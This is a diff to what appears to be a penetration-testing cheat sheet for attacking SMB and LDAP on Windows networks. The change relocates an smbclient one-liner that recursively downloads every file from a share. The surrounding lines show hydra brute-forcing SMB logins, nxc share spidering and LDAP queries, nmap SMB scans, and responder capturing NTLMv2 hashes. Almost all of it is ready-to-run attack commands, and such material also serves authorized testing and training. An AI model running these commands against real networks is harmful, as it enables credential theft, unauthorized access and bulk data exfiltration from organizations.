@@ -749,6 +749,9 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 (hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 (hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
+[###] Download Files Locally
+mkdir smb; smbclient //$TARGET/'SHARENAME' -U '$DOM/$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
+
 [###] Banner
 nmap $TARGET -sS -T5 --script="smb*protocols,smb*security-mode" -p445
 
@@ -757,9 +760,6 @@ nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --shares --use-kcache
 
 [###] Spider Share for Files
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME
-
-[###] Download Files Locally
-mkdir smb; smbclient //$TARGET/SHARE_NAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
 
 [###] Capture NTLMv2
 sudo responder -I tun0 -v
